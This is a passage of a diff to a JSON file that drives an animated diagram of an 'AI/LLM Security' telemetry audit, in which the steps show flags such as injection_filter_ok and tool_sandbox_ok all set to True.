+                "hit": 1
               }
+            },
+            "tones": {
+              "injection_filter_ok": "data",
+              "tool_sandbox_ok": "data",
+              "output_sanitizer_ok": "data",
+              "checks": "data"
+            },
+            "arrows": [
+              [
+                "injection_filter_ok",
+                "tool_sandbox_ok"
+              ],
+              [
+                "tool_sandbox_ok",
+                "output_sanitizer_ok"
+              ],
+              [
+                "output_sanitizer_ok",
+                "checks"
+              ]
             ]
           },
           {
-            "at": "say4",
-            "caption": "The core engine evaluates thresholds and safety invariants.",
-            "activeNodes": [
-              "core",
-              "verify"
-            ],
-            "nodes": [
-              {
-                "id": "input",
-                "label": "Input Stream",
-                "tone": "done"
+            "at": "say10",
+            "caption": "Continuous AI security auditing ensures that model safeguards adapt.",
+            "values": {
+              "injection_filter_ok": {
+                "var": "injection_filter_ok",
+                "line": 7,
+                "hit": 1
               },
-              {
-                "id": "core",
-                "label": "Core Engine",
-                "tone": "active"
+              "tool_sandbox_ok": {
+                "var": "tool_sandbox_ok",
+                "line": 7,
+                "hit": 1
               },
-              {
-                "id": "verify",
-                "label": "Safety Gate",
-                "tone": "active"
+              "output_sanitizer_ok": {
+                "var": "output_sanitizer_ok",
+                "line": 7,
+                "hit": 1
               },
-              {
-                "id": "out",
-                "label": "Verified Output",
-                "tone": "idle"
+              "checks": {
+                "var": "checks",
+                "line": 10,
+                "hit": 1
               }
-            ]
-          },
-          {
-            "at": "say6",
-            "caption": "Verified telemetry and status flags are emitted downstream.",
-            "activeNodes": [
-              "verify",
-              "out"
-            ],
-            "nodes": [
-              {
-                "id": "input",
-                "label": "Input Stream",
-                "tone": "done"
-              },
-              {
-                "id": "core",
-                "label": "Core Engine",
-                "tone": "done"
-              },
-              {
-                "id": "verify",
-                "label": "Safety Gate",
-                "tone": "done"
-              },
-              {
-                "id": "out",
-                "label": "Verified Output",
-                "tone": "active"
-              }
+            },
+            "tones": {
+              "injection_filter_ok": "ok",
+              "tool_sandbox_ok": "ok",
+              "output_sanitizer_ok": "ok",
+              "checks": "ok"
+            },
+            "arrows": [
+              [
+                "injection_filter_ok",
+                "tool_sandbox_ok"
+              ],
+              [
+                "tool_sandbox_ok",
+                "output_sanitizer_ok"
+              ],
+              [
+                "output_sanitizer_ok",
+                "checks"
+              ]
             ]
           }
         ]
@@ -1208,128 +695,111 @@
         "title": "AI/LLM Security — Production Telemetry & Verification Audit",
         "nodes": [
           {
-            "id": "input",
-            "label": "Input Stream"
+            "id": "injection_filter_ok",
+            "label": "injection_filter_ok"
           },
           {
-            "id": "core",
-            "label": "Core Engine"
+            "id": "tool_sandbox_ok",
+            "label": "tool_sandbox_ok"
           },
           {
-            "id": "verify",
-            "label": "Safety Gate"
+            "id": "output_sanitizer_ok",
+            "label": "output_sanitizer_ok"
           },
           {
-            "id": "out",
-            "label": "Verified Output"
-          }
-        ],
-        "edges": [
-          {
-            "from": "input",
-            "to": "core",
-            "label": "ingest"
-          },
-          {
-            "from": "core",
-            "to": "verify",
-            "label": "evaluate"
-          },
-          {
-            "from": "verify",
-            "to": "out",
-            "label": "commit"
+            "id": "checks",
+            "label": "checks"
           }
         ],
         "steps": [
           {
+            "at": "say1",
+            "caption": "Deploying secure AI applications requires continuous telemetry tracking.",
+            "values": {
+              "injection_filter_ok": "True",
+              "tool_sandbox_ok": "True",
+              "output_sanitizer_ok": "True",
+              "checks": "{'PROMPT_INJECTION_DEFENSE': True, 'TOO…"
+            },
+            "tones": {
+              "injection_filter_ok": "data",
+              "tool_sandbox_ok": "data",
+              "output_sanitizer_ok": "data",
+              "checks": "data"
+            },
+            "arrows": [
+              [
+                "injection_filter_ok",
+                "tool_sandbox_ok"
+              ],
+              [
+                "tool_sandbox_ok",
+                "output_sanitizer_ok"
+              ],
+              [
+                "output_sanitizer_ok",
+                "checks"
+              ]
+            ]
+          },
+          {
             "at": "say2",
-            "caption": "Incoming parameters enter the validation pipeline.",
-            "activeNodes": [
-              "input",
-              "core"
-            ],
-            "nodes": [
-              {
-                "id": "input",
-                "label": "Input Stream",
-                "tone": "active"
-              },
-              {
-                "id": "core",
-                "label": "Core Engine",
-                "tone": "active"
-              },
-              {
-                "id": "verify",
-                "label": "Safety Gate",
-                "tone": "idle"
-              },
-              {
-                "id": "out",
-                "label": "Verified Output",
-                "tone": "idle"
-              }
+            "caption": "An AI security certification auditor verifies that prompt injection.",
+            "values": {
+              "injection_filter_ok": "True",
+              "tool_sandbox_ok": "True",
+              "output_sanitizer_ok": "True",
+              "checks": "{'PROMPT_INJECTION_DEFENSE': True, 'TOO…"
+            },
+            "tones": {
+              "injection_filter_ok": "data",
+              "tool_sandbox_ok": "data",
+              "output_sanitizer_ok": "data",
+              "checks": "data"
+            },
+            "arrows": [
+              [
+                "injection_filter_ok",
+                "tool_sandbox_ok"
+              ],
+              [
+                "tool_sandbox_ok",
+                "output_sanitizer_ok"
+              ],
+              [
+                "output_sanitizer_ok",
+                "checks"
+              ]
             ]
           },
           {
-            "at": "say4",
-            "caption": "The core engine evaluates thresholds and safety invariants.",
-            "activeNodes": [
-              "core",
-              "verify"
-            ],
-            "nodes": [
-              {
-                "id": "input",
-                "label": "Input Stream",
-                "tone": "done"
-              },
-              {
-                "id": "core",
-                "label": "Core Engine",
-                "tone": "active"
-              },
-              {
-                "id": "verify",
-                "label": "Safety Gate",
-                "tone": "active"
-              },
-              {
-                "id": "out",
-                "label": "Verified Output",
-                "tone": "idle"
-              }
-            ]
-          },
-          {
-            "at": "say6",
-            "caption": "Verified telemetry and status flags are emitted downstream.",
-            "activeNodes": [
-              "verify",
-              "out"
-            ],
-            "nodes": [
-              {
-                "id": "input",
-                "label": "Input Stream",
-                "tone": "done"
-              },
-              {
-                "id": "core",
-                "label": "Core Engine",
-                "tone": "done"
-              },
-              {
-                "id": "verify",
-                "label": "Safety Gate",
-                "tone": "done"
-              },
-              {
-                "id": "out",
-                "label": "Verified Output",
-                "tone": "active"
-              }
+            "at": "say10",
+            "caption": "Continuous AI security auditing ensures that model safeguards adapt.",
+            "values": {
+              "injection_filter_ok": "True",
+              "tool_sandbox_ok": "True",
+              "output_sanitizer_ok": "True",
+              "checks": "{'PROMPT_INJECTION_DEFENSE': True, 'TOO…"
+            },
+            "tones": {
+              "injection_filter_ok": "ok",
+              "tool_sandbox_ok": "ok",
+              "output_sanitizer_ok": "ok",
+              "checks": "ok"
+            },
+            "arrows": [
+              [
+                "injection_filter_ok",
+                "tool_sandbox_ok"
+              ],
+              [
+                "tool_sandbox_ok",
+                "output_sanitizer_ok"
+              ],
+              [
+                "output_sanitizer_ok",
+                "checks"
+              ]
             ]
           }
         ]
